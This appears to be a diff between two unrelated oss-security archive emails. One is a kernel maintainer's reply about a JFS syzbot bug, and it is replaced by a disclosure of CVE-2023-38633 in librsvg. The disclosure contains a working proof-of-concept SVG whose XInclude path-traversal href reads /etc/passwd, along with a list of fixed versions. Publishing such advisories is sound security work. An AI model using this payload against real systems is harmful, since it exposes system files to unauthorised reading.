@@ -1,39 +1,46 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/05/15/3
-Message-ID: <2023051547-arming-kinsman-4f0a@gregkh>
-Date: Mon, 15 May 2023 14:05:18 +0200
-From: Greg KH <greg@...ah.com>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2023/07/27/1
+Message-ID: <73b96607-5080-939c-d354-33da849d195d@oracle.com>
+Date: Thu, 27 Jul 2023 13:36:17 -0700
+From: Alan Coopersmith <alan.coopersmith@...cle.com>
 To: oss-security@...ts.openwall.com
-Cc: hackerzheng666@...il.com
-Subject: Re: linux kernel 6.3.0: slab-use-after-free Write in txEnd due to race condition
+Subject: CVE-2023-38633 in librsvg: Arbitrary file read when xinclude href has special characters
 Content-Type: text/plain; charset=utf-8
 
-On Mon, May 15, 2023 at 09:34:36AM +0800, 蓝色的小羊 wrote:
-> Syzkaller reported an error "slab-use-after-free Write in txEnd".
+I haven't seen this go by yet, so for those who haven't seen it:
 
-In the JFS filesystem, right?
+https://gitlab.gnome.org/GNOME/librsvg/-/issues/996 reports:
 
-<snip>
+CVE-2023-38633: Arbitrary file read when xinclude href has special characters
 
->  fs/jfs/jfs_debug.c  | 2 ++
+This was reported by Zac Sims.
 
-	$ ./scripts/get_maintainer.pl fs/jfs/jfs_debug.c
-	Dave Kleikamp <shaggy@...nel.org> (odd fixer:JFS FILESYSTEM)
-	jfs-discussion@...ts.sourceforge.net (open list:JFS FILESYSTEM)
-	linux-kernel@...r.kernel.org (open list)
+<?xml version="1.0" encoding="UTF-8" standalone="no"?>
+<svg width="300" height="300" xmlns:xi="http://www.w3.org/2001/XInclude">
+   <rect width="300" height="300" style="fill:rgb(255,255,255);" />
+   <text x="10" y="100">
+     <xi:include href=".?../../../../../../../../../../etc/passwd" parse="text" 
+encoding="UTF-8">
+       <xi:fallback>file not found</xi:fallback>
+     </xi:include>
+   </text>
+</svg>
 
-Any specific reason you didn't send this to the mailing list and
-developers who can review and apply this potential fix to the kernel
-tree?
+This ends up actually including the contents of /etc/passwd, bypassing the 
+checks in UrlResolver::resolve_href().
 
-syzbot-reported issues are not really a new or exciting thing, we get
-loads of them every week (see the syzbot mailing list and summaries).
-What is good is for fixes like this one to be sent to us so that we can
-merge them for all to use.
+The above linked bug report provides further analysis and links to merge 
+requests for the fixes.   Fixes have been published in new releases of
+librsvg for many release trains:
 
-That is if anyone is actually using the JFS filesystem anymore, it is
-pretty obsolete.  Are you using it?
+     2.56.3
+     2.55.3
+     2.54.6
+     2.52.10
+     2.50.8
+     2.48.11
+     2.46.6
 
-thanks,
-
-greg k-h
+-- 
+         -Alan Coopersmith-                 alan.coopersmith@...cle.com
+          Oracle Solaris Engineering - https://blogs.oracle.com/solaris
